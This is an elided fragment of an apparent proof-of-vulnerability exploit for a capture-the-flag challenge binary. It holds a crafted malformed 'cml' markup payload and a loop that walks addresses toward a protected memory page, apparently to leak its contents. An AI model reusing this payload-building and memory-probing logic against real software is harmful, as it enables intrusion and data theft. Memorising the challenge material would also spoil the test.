#include <libpov.h>
// \x00<>
// =/&\x01\x00\x48<cml><cml><\x01\xc0\x47\x43AAAAAAAAYYYY></\x01\xc0\x47\x43AAAAAAAAYYYY><XXXX></XXXX></cml></cml>\x07\x01\x00\x00\x00\x00\x05\x04\x04\x84\x00\x01\x06\x02\x00\x00\x00
...
next_addr:
  ...
  try_again:
    ...
    for (i = 0; i < sizeof(chars); i++) {
      if (chars[i] == 0) goto try_again;
      if (memchr((void *)&addr, chars[i], 4) != 0) goto try_again;
      if (memchr((void *)"cml", chars[i], 3) != 0) goto try_again;
  ...
  random(tmp, 16, &bytes);
  for (i = 0; i < 16; i++) {
    while (memchr(chars, tmp[i], 6) != 0 || tmp[i] == 0) tmp[i]++;
  }
  i = 0;
  buf[i++] = 0x01;
  buf[i++] = 0x00;
  ...
  *(unsigned int *)&buf[1] = desc;
  ...
  if (size < 4) {
    if (size) length_read(STDIN, buf, size);
    if (addr < 0x4347C011) {
      addr += 4;
      goto next_addr;
    }
